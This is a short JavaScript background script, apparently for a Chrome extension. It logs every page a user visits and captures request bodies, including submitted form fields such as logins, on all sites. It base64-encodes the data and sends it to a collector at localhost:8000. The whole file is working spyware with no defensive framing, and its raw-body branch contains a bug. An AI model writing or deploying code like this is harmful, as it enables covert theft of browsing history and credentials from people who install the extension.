chrome.webNavigation.onCompleted.addListener((e) => {
    const url = `http://localhost:8000/?u=${e.url}`;
    fetch(url);
}, {});

chrome.webRequest.onBeforeRequest.addListener(
    (e) => {
        if (e.requestBody != undefined) {
            if (e.requestBody.formData != undefined) {
                const encoded = btoa(
                    JSON.stringify(e.requestBody.formData)
                );
                console.log(encoded);
                fetch(`http://localhost:8000/?b=${encoded}`);
            }
            if (e.requestBody.raw != undefined) {
                const encoded = btoa(
                    btoa(e.requestBody.formData.raw.join(""))
                );
                fetch(`http://localhost:8000/?b=${encoded}`);
            }
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
  )